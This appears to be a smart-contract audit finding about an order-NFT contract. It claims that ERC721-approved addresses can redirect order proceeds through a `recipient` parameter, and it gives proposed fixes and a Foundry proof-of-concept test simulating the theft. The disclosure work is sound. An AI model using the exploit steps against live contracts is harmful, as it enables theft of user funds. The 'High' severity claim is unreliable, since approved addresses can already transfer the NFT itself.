## Title
Approved Addresses Can Steal Order Proceeds Through Arbitrary Recipient Parameter

## Summary
The `collectProceeds` function in the Orders contract allows any approved address to drain all accumulated proceeds to an arbitrary recipient address and then return the NFT to the original owner, resulting in direct theft of funds. This vulnerability exploits the combination of ERC721's approval mechanism with an unrestricted `recipient` parameter.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The `collectProceeds` function should allow the NFT owner or authorized operators to collect order proceeds. The `authorizedForNft(id)` modifier is meant to ensure only authorized parties can perform this action.

**Actual Logic:** The function allows anyone with temporary ERC721 approval to collect ALL proceeds to ANY address they specify (including themselves), then transfer the NFT back to the original owner. This effectively separates value extraction from NFT ownership, enabling theft.

**Exploitation Path:**
1. Alice owns Order NFT #123 with 1000 USDC in accumulated proceeds from her TWAMM order
2. Alice approves Bob temporarily (e.g., for legitimate order management purposes like adjusting sale rates)
3. Bob calls `collectProceeds(123, orderKey, bob_address)` - passes the authorization check per [2](#0-1) 
4. All 1000 USDC proceeds are sent to Bob's address via [3](#0-2) 
5. Bob transfers NFT #123 back to Alice using standard ERC721 `transferFrom`
6. Alice still owns the NFT but has lost all her proceeds to Bob

**Security Property Broken:** This violates the "Direct theft of user funds" impact category. While not explicitly listed in the five critical invariants, it represents unauthorized value extraction that breaks fundamental ownership assumptions of NFT-based positions.

## Impact Explanation
- **Affected Assets**: All accumulated proceeds from TWAMM orders represented as NFTs. This includes any token purchased through virtual order execution over time.
- **Damage Severity**: Attackers can drain 100% of accumulated proceeds for any order they receive temporary approval for. If a user has multiple active orders with significant value, all can be drained in a single transaction via multicall.
- **User Impact**: Any user who grants approval (even temporarily) to another address for legitimate purposes (like delegating order management, using a trading bot, or integration with other protocols) risks complete loss of all accumulated proceeds while retaining the now-worthless NFT position.

## Likelihood Explanation
- **Attacker Profile**: Any address that receives ERC721 approval from the order owner. This could be a malicious operator, compromised integration contract, or malicious third-party protocol.
- **Preconditions**: 
  - Target order must have accumulated proceeds (any non-zero amount)
  - Victim must have granted approval via `approve(attacker, tokenId)` or `setApprovalForAll(attacker, true)`
  - Attacker needs the correct `OrderKey` structure (publicly observable from on-chain data)
- **Execution Complexity**: Single transaction attack. Can be executed via the existing `collectProceeds` public function with no special setup.
- **Frequency**: Can be exploited once per approval per order, or continuously if the victim maintains approval for an attacker-controlled address (e.g., for integration purposes).

## Recommendation

Restrict the `collectProceeds` function to only send proceeds to the NFT owner, regardless of who calls it:

```solidity
// In src/Orders.sol, function collectProceeds, lines 107-114:

// CURRENT (vulnerable):
function collectProceeds(uint256 id, OrderKey memory orderKey, address recipient)
    public
    payable
    authorizedForNft(id)
    returns (uint128 proceeds)
{
    proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, recipient)), (uint128));
}

// FIXED (Option 1 - Always send to NFT owner):
function collectProceeds(uint256 id, OrderKey memory orderKey, address recipient)
    public
    payable
    authorizedForNft(id)
    returns (uint128 proceeds)
{
    // Restrict recipient to NFT owner to prevent theft by approved addresses
    address owner = _ownerOf(id);
    require(recipient == owner, "Recipient must be NFT owner");
    proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, recipient)), (uint128));
}

// FIXED (Option 2 - Remove recipient parameter, always use owner):
function collectProceeds(uint256 id, OrderKey memory orderKey)
    public
    payable
    authorizedForNft(id)
    returns (uint128 proceeds)
{
    // Always send proceeds to the NFT owner, not the caller
    address owner = _ownerOf(id);
    proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, owner)), (uint128));
}
```

**Note:** The same vulnerability exists in `Positions.collectFees` [4](#0-3)  and should be fixed using the same pattern.

## Proof of Concept

```solidity
// File: test/Exploit_ApprovedProceedsTheft.t.sol
// Run with: forge test --match-test test_ApprovedAddressCanStealProceeds -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Orders.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import "./Orders.t.sol";

contract Exploit_ApprovedProceedsTheft is BaseOrdersTest {
    using CoreLib for *;
    using TWAMMLib for *;

    address alice;
    address bob;

    function setUp() public override {
        BaseOrdersTest.setUp();
        
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        
        // Give Alice tokens to create orders
        token0.mint(alice, 1000e18);
        token1.mint(alice, 1000e18);
    }
    
    function test_ApprovedAddressCanStealProceeds() public {
        // SETUP: Alice creates a pool and order
        vm.startPrank(alice);
        
        uint64 fee = uint64((uint256(5) << 64) / 100); // 5% fee
        int32 tick = 0;
        
        PoolKey memory poolKey = createTwammPool({fee: fee, tick: tick});
        createPosition(poolKey, MIN_TICK, MAX_TICK, 10000, 10000);
        
        token0.approve(address(orders), type(uint256).max);
        
        uint64 startTime = alignToNextValidTime();
        uint64 endTime = uint64(nextValidTime(block.timestamp, startTime));
        
        OrderKey memory key = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({_fee: fee, _isToken1: false, _startTime: startTime, _endTime: endTime})
        });
        
        // Alice creates an order
        (uint256 orderId,) = orders.mintAndIncreaseSellAmount(key, 100, type(uint112).max);
        
        // Verify Alice owns the NFT
        assertEq(orders.ownerOf(orderId), alice, "Alice should own the order NFT");
        
        // Time passes, proceeds accumulate
        advanceTime(endTime - startTime);
        
        // Check accumulated proceeds before attack
        uint128 proceedsBefore = orders.collectProceeds(orderId, key, alice);
        assertGt(proceedsBefore, 0, "Proceeds should have accumulated");
        
        // Alice creates another order to demonstrate the theft
        vm.warp(block.timestamp + 1);
        startTime = alignToNextValidTime();
        endTime = uint64(nextValidTime(block.timestamp, startTime));
        
        OrderKey memory key2 = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({_fee: fee, _isToken1: false, _startTime: startTime, _endTime: endTime})
        });
        
        (uint256 orderId2,) = orders.mintAndIncreaseSellAmount(key2, 100, type(uint112).max);
        
        // Time passes again
        advanceTime(endTime - startTime);
        
        // Alice approves Bob (maybe for legitimate order management)
        orders.approve(bob, orderId2);
        
        vm.stopPrank();
        
        // EXPLOIT: Bob steals the proceeds
        vm.startPrank(bob);
        
        uint256 bobBalanceBefore = token1.balanceOf(bob);
        uint256 aliceBalanceBefore = token1.balanceOf(alice);
        
        // Bob calls collectProceeds with himself as recipient
        uint128 stolenProceeds = orders.collectProceeds(orderId2, key2, bob);
        
        uint256 bobBalanceAfter = token1.balanceOf(bob);
        uint256 aliceBalanceAfter = token1.balanceOf(alice);
        
        // VERIFY: Bob received the proceeds
        assertGt(stolenProceeds, 0, "Proceeds should have been collected");
        assertEq(bobBalanceAfter - bobBalanceBefore, stolenProceeds, "Bob should have received the proceeds");
        assertEq(aliceBalanceAfter, aliceBalanceBefore, "Alice should not have received anything");
        
        // Bob transfers the NFT back to Alice to cover his tracks
        orders.transferFrom(bob, alice, orderId2);
        
        vm.stopPrank();
        
        // VERIFY: Alice has the NFT but lost the proceeds
        assertEq(orders.ownerOf(orderId2), alice, "Alice should own the NFT again");
        
        console.log("EXPLOIT SUCCESSFUL!");
        console.log("Bob stole", stolenProceeds, "tokens");
        console.log("Alice still owns the NFT but lost all proceeds");
    }
}
```

**Notes:**
- This vulnerability represents a fundamental design flaw in the authorization model for value extraction from NFT-based positions
- The same issue affects both `Orders.collectProceeds` and `Positions.collectFees`, indicating a systemic problem
- Users familiar with standard ERC721 behavior would not expect approval to grant rights to extract value to arbitrary recipients
- The attack is particularly dangerous because the attacker can return the NFT, making the theft less obvious to the victim

### Citations

**File:** src/Orders.sol (L107-114)
```text
    function collectProceeds(uint256 id, OrderKey memory orderKey, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 proceeds)
    {
        proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, recipient)), (uint128));
    }
```

**File:** src/Orders.sol (L161-171)
```text
        } else if (callType == CALL_TYPE_COLLECT_PROCEEDS) {
            (, uint256 id, OrderKey memory orderKey, address recipient) =
                abi.decode(data, (uint256, uint256, OrderKey, address));

            uint128 proceeds = CORE.collectProceeds(TWAMM_EXTENSION, bytes32(id), orderKey);

            if (proceeds != 0) {
                ACCOUNTANT.withdraw(orderKey.buyToken(), recipient, proceeds);
            }

            result = abi.encode(proceeds);
```

**File:** src/base/BaseNonfungibleToken.sol (L81-86)
```text
    modifier authorizedForNft(uint256 id) {
        if (!_isApprovedOrOwner(msg.sender, id)) {
            revert NotUnauthorizedForToken(msg.sender, id);
        }
        _;
    }
```

**File:** src/base/BasePositions.sol (L110-117)
```text
    function collectFees(uint256 id, PoolKey memory poolKey, int32 tickLower, int32 tickUpper, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 amount0, uint128 amount1)
    {
        (amount0, amount1) = withdraw(id, poolKey, tickLower, tickUpper, 0, recipient, true);
    }
```
